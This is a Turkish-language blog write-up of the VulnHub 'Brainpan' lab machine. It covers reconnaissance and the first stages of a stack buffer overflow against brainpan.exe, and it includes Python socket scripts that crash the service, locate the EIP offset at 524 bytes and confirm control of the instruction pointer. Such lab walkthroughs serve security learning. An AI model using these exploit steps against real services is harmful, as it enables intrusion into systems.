---
layout: post
title: "Brainpan Writeup"
date: 2019-06-28
excerpt: "28 Jun 2019"
comments: false
---

Uzun bir aradan sonra Brainpan zafiyetli makinasının çözümünü yazacağım. Root olmaya giden yolda Buffer Overflow zafiyeti barındıran bir programın exploit edilmesi gerektiğinden bu konuyada uzun uzadıya değineceğim. Brainpan imajına [bu linkten](https://www.vulnhub.com/entry/brainpan-1,51/) ulaşabilirsiniz. 

Hızlı bir nmap taraması ile başlıyoruz.

<figure >
    <img src="/assets/img/brainpan1.png">
</figure>

Alışılmışın dışında 9999. ve 10000. portlar açık. HTTP servisine yöneliyoruz. Görünürde olan statik bir HTML sayfası.

<figure >
    <img src="/assets/img/brainpan2.png">
</figure>

Fuzzing sonucu keşfettiğimiz bin/ dizinini ziyaret ediyoruz.

<figure >
    <img src="/assets/img/brainpan3.png">
</figure>

Dosyayı indirip Windows işletim sistemi üzerinde çalıştırdığımızda, 9999. port üzerinden dinleme yaptığını görüyoruz. Hedef makinanın 9999. portu üzerinde çalışan uygulamanın brainpan.exe olma ihtimali yüksek. 

<figure >
    <img src="/assets/img/brainpan5.jpeg">
</figure>

Hedef makina ile 9999 portu üzerinden bağlantı kuruyoruz.

<figure >
    <img src="/assets/img/brainpan4.png">
</figure>

Uygulamanın kullanıcıdan input alıyor olması ve ve statik analizde karşılaşılan strcpy gibi fonksiyonlar ilk olarak buffer overflow zafiyetini hatırlatıyor. Daha ayrıntılı incelemeye Windows 7 işletim sistemi üzerinde devam ediyoruz. 


Uygulamayı Immunity Debugger içerisinde açıp, çalıştırıyoruz. 

<figure >
    <img src="/assets/img/brainpan6.PNG">
</figure>

Öncelikle bir overflow olup olmadığı tespit ediyoruz. Bunun için başlangıç olarak 1000 karakter boyutunda bir input gönderiyoruz.

{% highlight python %}

#!/usr/bin/python

import socket
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.198.146',9999))

buffer="A"*1000

s.recv(1024)
s.send(buffer)

{% endhighlight %}

<figure >
    <img src="/assets/img/brainpan7.PNG">
</figure>

EIP üzerine, yani sıradaki komutu işaret eden pointer üzerine göndermiş olduğumuz A karakterleri basılmış. Anlıyoruz ki bir overflow durumu var. 

Burdan sonra yapılması gerekenler sırasıyla şu şekilde:

+ Overflow'un gerçekleştiği sınırı belirlemek.
+ Uygulama içerisinde bizi stack'e yönlendirecek adresi bulmak. 
+ Kodumuzun yürütülmesine engel olan karakterleri (badchar) belirlemek.
+ Stack'e uygun shellcode'u yerleştirmek.

Overflow'un gerçekleştiği sınırı bulmak için, 1000 adet A göndermek yerine 1000 byte boyutunda bir pattern gönderiyoruz. Daha sonra EIP üzerine yazılan değerden yola çıkarak buffer boyutunu öğrenmiş oluyoruz. Bunun için metasploit içerisinde bulunan pattern_create ve pattern_offset scriptlerini kullanacağız.

1000 byte boyutundaki patternimizi oluşturuyoruz.

<figure >
    <img src="/assets/img/brainpan8.png">
</figure>

{% highlight python %}

#!/usr/bin/python

import socket
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.198.146',9999))

buffer="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

s.recv(1024)
s.send(buffer)

{% endhighlight %}

<figure >
    <img src="/assets/img/brainpan9.PNG">
</figure>

EIP üzerine yazılan değer "35724134" şeklinde.

<figure >
    <img src="/assets/img/brainpan10.png">
</figure>

pattern_offset scriptini kullanarak bu değerin 524 byte'a karşılık geldiğini öğreniyoruz. Yani bufferın boyutu 524 byte.

Doğrulamak adına bu kez 524 adet A, buna ek olarakta 4 adet B karakteri gönderiyoruz. Böylece EIP üzerinde 42424242 değerini görmeyi bekliyoruz.

{% highlight python %}

#!/usr/bin/python

import socket
import sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.198.146',9999))

buffer="A"*524 + "BBBB"  + "ABCDEFGHJKLMNO123456789abcdefghijklmn"

s.recv(1024)
s.send(buffer)

{% endhighlight %}

